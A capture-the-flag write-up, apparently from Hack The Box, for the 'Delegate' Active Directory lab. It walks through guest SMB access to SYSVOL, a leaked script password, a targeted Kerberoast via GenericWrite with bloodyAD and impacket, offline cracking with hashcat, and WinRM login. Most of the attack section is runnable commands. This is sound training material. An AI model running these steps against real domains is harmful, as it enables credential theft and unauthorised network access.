## Overview

Delegate is a medium-difficulty Windows Active Directory box. The foothold is a classic AD information-disclosure chain: a near-anonymous `guest` SMB session can browse `SYSVOL`, where a logon/setup batch script was left with a password hard-coded in it. That account turns out to hold a dangerous ACL — `GenericWrite` — over a second user, which is enough to make that second user Kerberoastable on demand, crack their ticket offline, and authenticate over WinRM. This post covers recon through the user flag.

Realistic AD chain: guest SMB reads a SYSVOL script leaking a password, then GenericWrite enables a targeted Kerberoast cracked offline for WinRM; no CVE, BloodHound-and-impacket point-and-click.

## Recon

```bash
nmap -sC -sV 10.129.234.69
```

| Port | Service |
|------|---------|
| 53 | DNS |
| 88 | Kerberos |
| 135 / 139 / 445 | RPC / NetBIOS / SMB |
| 389 / 636 / 3268 / 3269 | LDAP / LDAPS / Global Catalog |
| 464 | kpasswd |
| 5985 | WinRM |
| 9389 | ADWS |

The port profile is a textbook Domain Controller. The domain is `delegate.vl` and the DC is `DC1.delegate.vl` — add both to `/etc/hosts`:

```bash
echo "10.129.234.69 dc1.delegate.vl delegate.vl DC1" | sudo tee -a /etc/hosts
```

With a DC and no web surface, the first move is to see how much an unauthenticated/guest session can read over SMB.

## Enumeration

The `guest` account is enabled and can list shares:

```bash
nxc smb 10.129.234.69 -u guest -p '' --shares
```

`SYSVOL` is readable. SYSVOL is replicated to every domain controller and is readable by all domain principals — it is meant for logon scripts and policy, never secrets. Spider it for scripts:

```bash
smbclient //10.129.234.69/SYSVOL -N -c "recurse; ls" 2>/dev/null | grep -iE '\.bat|\.ps1'
```

A batch script in the `scripts` folder contains a plaintext credential for the domain user `A.Briggs`. That is the foothold credential.

![Guest SMB session reading SYSVOL](/assets/Images/delegate-001_foothold_smb-sysvol.png)

With a valid domain user, collect the AD graph and look for attack paths:

```bash
rusthound-ce --domain delegate.vl -u A.Briggs -p '<redacted>' --zip
```

BloodHound shows `A.Briggs` has **GenericWrite** over the user `N.Thompson`. `GenericWrite` lets you write object attributes — including `servicePrincipalName`.

## Foothold

Any account that has an SPN is Kerberoastable: anyone can request a service ticket for it, and that ticket is encrypted with the account's password hash, crackable offline. `A.Briggs` can't read `N.Thompson`'s password, but with `GenericWrite` it can *temporarily plant a fake SPN* on `N.Thompson`, roast it, then clean up — a "targeted Kerberoast".

Plant a fake SPN, request the ticket, and remove the SPN afterward:

```bash
bloodyAD -d delegate.vl -u A.Briggs -p '<redacted>' --host dc1.delegate.vl set object N.Thompson servicePrincipalName -v 'fake/dc.delegate.vl'
impacket-GetUserSPNs delegate.vl/A.Briggs:'<redacted>' -dc-ip 10.129.234.69 -request -outputfile nt.hash
bloodyAD -d delegate.vl -u A.Briggs -p '<redacted>' --host dc1.delegate.vl remove object N.Thompson servicePrincipalName -v 'fake/dc.delegate.vl'
```

Crack the roasted ticket (Kerberos 5 TGS-REP, hashcat mode 13100) against rockyou:

```bash
hashcat -m 13100 nt.hash /usr/share/wordlists/rockyou.txt
```

The password cracks quickly. `N.Thompson` is a member of **Remote Management Users**, so the credential is directly usable over WinRM:

```bash
evil-winrm -i 10.129.234.69 -u N.Thompson -p '<redacted>'
```

## User flag

type C:\Users\N.Thompson\Desktop\user.txt   # HTB{...}
